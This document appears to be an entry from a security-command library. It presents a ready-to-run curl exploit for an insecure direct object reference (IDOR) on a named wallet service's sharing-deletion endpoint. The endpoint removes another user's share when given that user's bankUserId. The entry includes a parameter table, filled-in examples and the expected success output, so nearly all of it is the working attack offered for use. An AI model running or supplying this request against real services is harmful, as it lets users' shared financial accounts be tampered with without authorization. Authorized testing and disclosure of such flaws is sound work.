---
data: >-
  curl -X POST
  "https://wallet.romit.io/dashboard/account/<accountID>/sharing/delete" -H
  "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With:
  XMLHttpRequest" -H "Cookie: <redacted>" -d "bankUserId=<User C's
  ID>&_csrf=3b919c4a-776f-4144-84b7-88d315f57815"
tags:
  - idor
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.433Z'
id: fc89410f-85db-4e62-9877-d014f36e772f
verified: false
validated: true
submitted: true
---
# curl-delete-wallet-share-idor

## Command

```bash
curl -X POST "https://wallet.romit.io/dashboard/account/<accountID>/sharing/delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: <redacted>" \
  -d "bankUserId=<User C's ID>&_csrf=3b919c4a-776f-4144-84b7-88d315f57815"
```

## Description

This curl command sends a POST request to the Enter wallet app's sharing deletion endpoint, exploiting an IDOR by specifying another user's bankUserId without authorization checks. Use it to test or demonstrate unauthorized share removal in shared wallets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<accountID>` | The ID of the target wallet account in the URL path | Yes |
| `bankUserId` | The ID of the user whose share is to be deleted (victim's ID) | Yes |
| `_csrf` | The CSRF protection token from the session | Yes |
| `Cookie` | Session cookies for authentication (redacted for security) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://wallet.romit.io/dashboard/account/12345/sharing/delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: session=abc123" \
  -d "bankUserId=67890&_csrf=3b919c4a-776f-4144-84b7-88d315f57815"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST "https://wallet.romit.io/dashboard/account/12345/sharing/delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: session=abc123" \
  -d "bankUserId=67890&_csrf=3b919c4a-776f-4144-84b7-88d315f57815"
```

## Expected Output

Successful execution returns an HTTP 200 OK response with JSON or HTML indicating the share was deleted, such as {"status":"success"}. Failure due to invalid tokens may return 403 or 400 errors.

## Related

- [[Related Procedure: Exploit-IDOR-to-Delete-Wallet-Share]]
